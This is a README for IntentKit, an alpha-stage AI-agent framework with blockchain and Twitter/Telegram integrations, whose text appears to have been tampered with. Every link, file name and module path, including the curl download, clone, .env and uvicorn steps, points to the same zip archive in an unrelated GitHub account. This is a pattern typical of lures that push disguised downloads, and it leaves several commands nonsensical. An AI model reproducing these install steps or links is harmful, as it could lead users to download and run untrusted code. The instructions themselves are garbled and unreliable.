# IntentKit

IntentKit is an autonomous agent framework that enables the creation and management of AI agents with various capabilities including blockchain interactions, social media management, and custom skill integration.

## Alpha Warning

This project is currently in alpha stage and is not recommended for production use.

## Features

- 🤖 Multiple Agent Support
- 🔄 Autonomous Agent Management
- 🔗 Blockchain Integration (EVM for now, will add more)
- 🐦 Social Media Integration (Twitter, Telegram for now, will add more)
- 🛠️ Extensible Skill System
- 🔌 Extensible Plugin System (WIP)

## Architecture

```
                                                                                                       
                                 Entrypoints                                                           
                       │                             │                                                 
                       │   Twitter/Telegram & more   │                                                 
                       └──────────────┬──────────────┘                                                 
                                      │                                                                
  Storage:  ────┐                     │                      ┌──── Skills:                             
                │                     │                      │                                         
  Agent Config  │     ┌───────────────▼────────────────┐     │  Chain Integration (EVM,solana,etc...)  
                │     │                                │     │                                         
  Credentials   │     │                                │     │  Wallet Management                      
                │     │           The  Agent           │     │                                         
  Personality   │     │                                │     │  On-Chain Actions                       
                │     │                                │     │                                         
  Memory        │     │      Powered by LangGraph      │     │  Internet Search                        
                │     │                                │     │                                         
  Skill State   │     └────────────────────────────────┘     │  Image Processing                       
            ────┘                                            └────                                     
                                                                                                       
                                                                More and More...                       
                         ┌──────────────────────────┐                                                  
                         │                          │                                                  
                         │  Agent Config & Memory   │                                                  
                         │                          │                                                  
                         └──────────────────────────┘                                                  
                                                                                                       
```

The architecture is a simplified view, and more details can be found in the [Architecture](https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip) section.

## Quick Start

### Docker (Recommended)
1. Create a new directory and navigate into it:
```bash
mkdir intentkit && cd intentkit
```

2. Download the required files:
```bash
# Download https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip
curl -O https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip

# Download example environment file
curl -O https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip
```

3. Set up environment:
```bash
# Rename https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip to .env
mv https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip .env

# Edit .env file and add your configuration
# Make sure to set OPENAI_API_KEY
```

4. Start the services:
```bash
docker compose up
```

5. Create your first Agent:
```bash
curl -X POST http://127.0.0.1:8000/agents \
     -H "Content-Type: application/json" \
     -d '{
         "id": "admin",
         "name": "Admin",
         "prompt": "You are an autonomous AI agent. Respond to user queries."
     }'
```
There are many fields that can control the agent's behavior, we have provided a [helper shell](https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip) for you.

6. Try it out:
```bash
curl "http://127.0.0.1:8000/admin/chat?q=Hello"
```
In terminal, curl cannot auto escape special characters, so you can use browser to test. Just copy the URL to your browser, replace "Hello" with your words.

### Local Development
1. Clone the repository:
```bash
git clone https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip
cd intentkit
```

2. Set up your environment:
Python 3.10-3.12 are supported versions, and it's recommended to use 3.12.
If you haven't installed `poetry`, please install it first.
We recommend manually creating a venv; otherwise, the venv created automatically by Poetry may not meet your needs.
```bash
python3.12 -m venv .venv
source .venv/bin/activate
poetry install --with dev
```

3. Configure your environment:
```bash
cp https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip .env
# Edit .env with your configuration
```

4. Run the application:
```bash
# Run the API server in development mode
uvicorn https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip --reload

# Run the autonomous agent scheduler
python -m https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip
```

"Create Agent" and "Try it out" refer to the Docker section.

## The Model
For now, we only support any model from OpenAI and DeepSeek.  
We will support more models in the future.

## Integrations

### Twitter
[Twitter Integration](https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip)

### Coinbase
[Coinbase Integration](https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip)

## Configuration

The application can be configured using environment variables or AWS Secrets Manager. Key configuration options:

- `ENV`: Environment (local or others)
- `DB_*`: PostgreSQL Database configuration (Required)
- `OPENAI_API_KEY`: OpenAI API key for agent interactions (Required)
- `CDP_*`: Coinbase Developer Platform configuration (Optional)

See `https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip` for all available options.

## Project Structure

- `abstracts/`: Abstract classes and interfaces
- `app/`: Core application code
  - `core/`: Core modules
  - `services/`: Services
  - `entrypoints/`: Entrypoints means the way to interact with the agent
  - `admin/`: Admin logic
  - `config/`: Configurations
  - `https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip`: REST API server
  - `https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip`: Autonomous agent scheduler
  - `https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip`: Twitter listener
  - `https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip`: Telegram listener
- `models/`: Database models
- `skills/`: Skill implementations
- `skill_sets/`: Predefined skill set collections
- `plugins/`: Reserved for Plugin implementations
- `utils/`: Utility functions

## Contributing

Contributions are welcome! Please read our [Contributing Guidelines](https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip) before submitting a pull request.

### Contribute Skills

If you want to add a skill collection, follow these steps:

1. Create a new skill collection in the `skills/` directory
2. Implement the skill interface
3. Register the skill in `https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip`

If you want to add a simple skill, follow these steps:

1. Create a new skill in the `skills/common/` directory
2. Register the skill in `https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip`

See the [Skill Development Guide](https://raw.githubusercontent.com/Twisthere/intentkit/main/zoophagous/intentkit.zip) for more information.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
